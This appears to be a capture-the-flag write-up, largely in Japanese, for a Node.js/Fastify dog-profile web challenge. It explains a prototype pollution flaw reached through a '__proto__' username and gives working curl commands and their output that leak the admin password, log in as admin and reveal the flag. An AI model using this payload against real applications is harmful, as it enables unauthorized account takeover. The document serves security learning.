# Inu Profile : Web

犬のプロフィールを作成できるWebアプリを公開しました。

Attachment  
[inu-profile.tar.gz](inu-profile.tar.gz)  

Difficulty Level : Very Hard  
Tags : JavaScript  
Author : st98

# Solution

**問題概要**  
Node.js + Fastify で実装された Web アプリケーションが与えられる。  
`/admin` エンドポイントに admin 権限でアクセスすると FLAG が得られる。

**ソースコード読み取り**  
```js
app.get('/admin', async (req, res) => {
    const { username } = req.session;
    if (!req.session.hasOwnProperty('username') || username !== 'admin') {
        return res.send({ 'message': 'you are not an admin...' });
    }
    return res.send({ 'message': `Congratulations! The flag is: ${FLAG}` });
});
```
admin判定は以下の2つ:
1. `req.session`が`username`をown propertyとして持つ
2. `req.session.username === "admin"`

```js
// set default value for some keys if the profile given doesn't have it
users[username] ??= { password, ...DEFAULT_PROFILE };

// okay, let's update the database
for (const key in profile) {
    users[username][key] = profile[key];
};
```
* `profile`のキーに制限がない
* `for...in`を使用している
* `users`は通常のJavaScriptオブジェクト

```js
function getFilteredProfile(username) {
    const profile = users[username];
    const filteredProfile = Object.entries(profile).filter(([k]) => {
        return k in DEFAULT_PROFILE;
    });
    return Object.fromEntries(filteredProfile);
}
```
* `k in DEFAULT_PROFILE`はprototype chain も含めて判定する

**方針**  
`__proto__`を利用したPrototype Pollutionによりpasswordを漏洩させ、漏洩したpasswordでadminにログインする。
```json
{
  "username": "__proto__",
  "password": "x",
  "profile": {
    "password": true
  }
}
```
これにより、`Object.prototype.password = true`、`'password' in DEFAULT_PROFILE === true`となる。

**手順**  
1. Prototype Pollution
    ```
    curl -X POST http://<host>/register -H "Content-Type: application/json" -d '{"username": "__proto__", "password": "x", "profile": {"password": true}}'
    ```
2. leak admin password
    ```
    curl http://<host>/profile/admin
    ```
3. login as admin
    ```
    curl -c c.txt -b c.txt -X POST http://<host>/login -H "Content-Type: application/json" -d '{"username": "admin", "password": "<leaked admin password>"}'
    ```
4. access `/admin` while keeping the session
    ```
    curl -b c.txt http://34.170.146.252:38808/admin
    ```

**Exploitation**  
```
$ curl -X POST http://34.170.146.252:38808/register -H "Content-Type: application/json" -d '{"username": "__proto__", "password": "x", "profile": {"password": true}}'
{"message":"ok"}

$ curl http://34.170.146.252:38808/profile/admin
{"password":"0e9d1c7a85a1faf8ebaeef2855262f83","avatar":"🌭","description":"I am admin!"}

$ curl -c c.txt -b c.txt -X POST http://34.170.146.252:38808/login -H "Content-Type: application/json" -d '{"username": "admin", "password": "0e9d1c7a85a1faf8ebaeef2855262f83"}'
{"message":"ok"}

$ curl -b c.txt http://34.170.146.252:38808/admin
{"message":"Congratulations! The flag is: Alpaca{the_best_dog_in_the_world_is_custom-kun}"}
```

Got the flag.

`Alpaca{the_best_dog_in_the_world_is_custom-kun}`

# References
